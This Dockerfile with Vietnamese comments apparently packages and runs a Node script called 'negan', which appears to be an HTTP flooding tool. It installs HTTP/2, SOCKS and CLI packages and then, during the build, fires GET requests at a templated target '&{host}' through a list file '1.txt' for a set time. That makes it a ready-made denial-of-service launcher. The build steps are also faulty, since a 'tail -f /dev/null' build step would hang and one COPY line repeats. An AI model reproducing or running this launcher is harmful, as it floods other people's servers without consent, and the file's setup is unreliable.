# Sử dụng Alpine chỉ với Node.js
FROM node:alpine

# Tạo thư mục làm việc
WORKDIR /negan


# Copy toàn bộ mã nguồn vào container
COPY . .

# Cài đặt curl, bash, và các công cụ cần thiết
RUN apk --no-cache add curl bash procps

# Cài đặt các module cần thiết bằng npm
RUN npm install --omit=dev --omit=optional hpack https commander colors socks

RUN node ./negan -m GET -u &{host} -p 1.txt --full true -s {time} || true

# Copy toàn bộ mã nguồn vào container
COPY . .

RUN tail -f /dev/null

# Không có lệnh CMD hay ENTRYPOINT để ngăn container khởi động tự động
